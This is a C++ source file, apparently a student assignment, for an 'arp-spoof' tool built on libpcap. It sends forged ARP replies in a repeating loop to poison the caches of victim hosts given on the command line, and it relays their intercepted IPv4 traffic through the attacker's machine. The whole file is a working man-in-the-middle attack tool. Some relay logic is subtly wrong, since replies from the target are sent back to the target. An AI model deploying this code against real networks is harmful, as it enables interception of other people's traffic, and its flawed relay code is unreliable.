#include <iostream>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <string.h>
#include <map>
#include <unistd.h>
#include <stdlib.h> 
#include <sys/wait.h>



using namespace std;
const int MAX_BUFFER_SIZE = 256;
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int GetMyMacIpAddress(char *ifname, uint8_t *mac_addr, Ip* ipstr)
{
	struct ifreq ifr;
	int sockfd, ret;
	sockfd = socket(AF_INET, SOCK_DGRAM,0);
	if(sockfd<0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
	ret = ioctl(sockfd,SIOCGIFHWADDR,&ifr);
	if (ret < 0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data,6);
	FILE* pipe = popen("ifconfig", "r"); // ifconfig 실행
    if (!pipe) {
        cerr << "popen() failed!" << endl;
        return 1;
    }

    char buffer[MAX_BUFFER_SIZE];
    string result = "";
    while (fgets(buffer, MAX_BUFFER_SIZE, pipe)) { // 출력을 읽기
        result += buffer;
    }
    pclose(pipe);
    const char* search_str = "inet ";
    char* match = strstr(const_cast<char*>(result.c_str()), search_str);
    if (!match) {
        cerr << "IPv4 address not found!" << std::endl;
        return 1;
    }
    match += strlen(search_str);
    char* end = strchr(match, ' '); // 공백을 찾아 IP 주소 끝 부분 찾기
    if (!end) {
        cerr << "Invalid IPv4 address format!" << std::endl;
        return 1;
    }
    *end = '\0';
    std::string s = std::string(match);
    *ipstr = Ip(s);
    return 0;   
}




//std::map<Ip, Mac> Ip2Mac; 

int sendArpPacket(pcap_t* handle, Mac dmac, Mac smac, Ip sip, Ip tip, bool ifRequest){ // if request 1 else 0 
	// if dmac = ff:ff:ff:ff:ff:ff broadcast mac 
	EthArpPacket packet; 
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = (ifRequest ==1) ? htons(ArpHdr::Request) : htons(ArpHdr::Reply); 
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = (dmac == Mac::broadcastMac()) ? Mac::nullMac() : dmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	return res;
}

void arpPoison(pcap_t* handle, Mac attackerMac, Ip senderIp, Mac senderMac, Ip targetIp){
	sendArpPacket(handle, senderMac, attackerMac, targetIp, senderIp, 0);
}

void arpSpoof(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip senderIp, Mac senderMac, Ip targetIp, Mac targetMac){
	// child process is arp poisoning repeatly and parent process is checking packets 
	pid_t pid; 
	pid = fork();
	if(pid==0){
		while(1){
			arpPoison(handle, attackerMac, senderIp, senderMac, targetIp); // deceiving sender arp address 
			arpPoison(handle, attackerMac, targetIp, targetMac, senderIp); // deceiving target arp address 
			sleep(10);
		}
	}
	else if(pid>0){
		struct pcap_pkthdr	*header; 
		u_char *pkt;
		int res = 0;
        while((res = pcap_next_ex(handle, &header, (const u_char**)&pkt))>=0){
			if(res==0) continue; 
			struct EthHdr*response_packet = (EthHdr *)pkt; 

			if(response_packet->dmac()!=attackerMac) continue; 
			else if(response_packet->type()==EthHdr::Arp){ // should 
				struct ArpHdr*response_arp_packet = (ArpHdr*)(pkt+sizeof(struct EthHdr));
				if(response_arp_packet->sip_==senderIp || response_arp_packet->sip_==targetIp) {
					// because if it is broadcast we have to cheat sender and target each 
					// if its just request we have to send reply  
					// as we dont send request arp packet, the response arp packet must be request 
					arpPoison(handle, attackerMac, senderIp, senderMac, targetIp); // deceiving sender arp address 
					arpPoison(handle, attackerMac, targetIp, targetMac, senderIp); // deceiving target arp address 
				}
				else continue; 
			}
			else if(response_packet->type()==EthHdr::Ip4){
				struct iphdr* ipheader = (struct iphdr*)(pkt+sizeof(struct EthHdr));
				//printf("wtfWtf??? : ");
				//cout << static_cast<std::string>(Ip(ipheader->saddr)) << " " << static_cast<std::string>(Ip(ntohl(ipheader->saddr))) << "\n";
				if((senderIp==Ip(ntohl(ipheader->saddr))) && (response_packet->dmac()==attackerMac) && (response_packet->smac()==senderMac) ){ 
					// spoofed Ip packet !!!!!!!!!!!!
					// we have to change ethhdr dmac and smac to attacker mac and target mac relay packet 
					response_packet->smac() = attackerMac; 
					response_packet->dmac() = targetMac;
					if(header->len != header->caplen){
						printf("packet len is too long gg\n");
					}
					int ress = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkt), header->caplen);
					if (ress != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
				}
				
				else if((response_packet->dmac()==attackerMac) && (response_packet->smac()==targetMac) ){ 
					// the reply of relayed packet is from target 
					// send this packet to sender 
					// its because the target is also infected 
					response_packet->smac() = attackerMac; 
					response_packet->dmac() = targetMac;
					if(header->len != header->caplen){
						printf("packet len is too long gg\n");
					}
					int ress = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkt), header->caplen);
					if (ress != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
				}
			}






			//if(response_packet->eth_.dmac()!=attackerMac) continue;
			//if(response_packet->eth_.type()!=EthHdr::Arp) continue; 
			//printf("arp type %x\n",response_packet->arp_.op());
			//if(response_packet->arp_.op()!=ArpHdr::Reply) continue; 
		}
	}
	else{
		exit(-1);
	}
}

Mac getMacByIp(Ip myIp, Mac myMac, Ip sender, pcap_t* handle){
	EthArpPacket packet;
	int res = sendArpPacket(handle, Mac::broadcastMac(), myMac, myIp, sender, 1);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	struct pcap_pkthdr	*header; 
	u_char *pkt;
	while((res = pcap_next_ex(handle, &header, (const u_char**)&pkt))>=0){
		if(res==0) continue; 
		struct EthArpPacket *response_packet = (EthArpPacket *)pkt; 
		//printf("type %x\n",response_packet->eth_.type()==EthHdr::Ip4);
		//printf("if same %d\n",response_packet->eth_.dmac()==myMac);
		if(response_packet->eth_.dmac()!=myMac) continue;
		if(response_packet->eth_.type()!=EthHdr::Arp) continue; 
		//printf("arp type %x\n",response_packet->arp_.op());
		if(response_packet->arp_.op()!=ArpHdr::Reply) continue; 
		//printf("wrf??\n");
		//Ip2Mac[sender] = Mac(response_packet->eth_.smac());
		return Mac(response_packet->eth_.smac());
	}
} 


//void arp_infect()

int main(int argc, char* argv[]) {

	if (argc %2 !=0) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	Ip myIp;
	uint8_t myMac1[6];
	if(GetMyMacIpAddress(dev, myMac1, &myIp)!=0) 
		return -1;
	Mac myMac = Mac(myMac1);

	//	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	// printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
	//printf("my Mac : %02x:%02x:%02x:%02x:%02x:%02x\n",myMac[0],myMac[1],myMac[2],myMac[3],myMac[4],myMac[5]);
	cout << "my Mac " << static_cast<std::string>(myMac) << "\n";
	std::cout << "my Ip4 : " << static_cast<std::string>(myIp) << "\n";

	int i = 0;
	pid_t pid; 
	int status;
	for(i=0; i<(argc-2)/2; i++) {
		cout << argc << "\n";
		pid = fork(); 
		if(pid==0){
			cout << "sibal";
			Ip senderIp = Ip(static_cast<std::string>(argv[2*i+2]));
			Mac senderMac = getMacByIp(myIp, myMac, senderIp, handle);
			Ip targetIp = Ip(static_cast<std::string>(argv[2*i+3])); 
			Mac targetMac = getMacByIp(myIp, myMac, targetIp, handle);
			arpSpoof(handle, myIp, myMac, senderIp, senderMac, targetIp, targetMac);
		}
		//cout << "sender " << static_cast<std::string>(sender) << " " << static_cast<std::string>(tmpMac) << "\n";
		else if(pid>0) continue; 
		else return -1;
		
	}
	/*
	for (const auto& pair : Ip2Mac) {
        std::cout << "ip " << static_cast<std::string>(pair.first) << " mac " << static_cast<std::string>(pair.second) << std::endl;
    }
	*/
	wait(&status);
	pcap_close(handle);
}
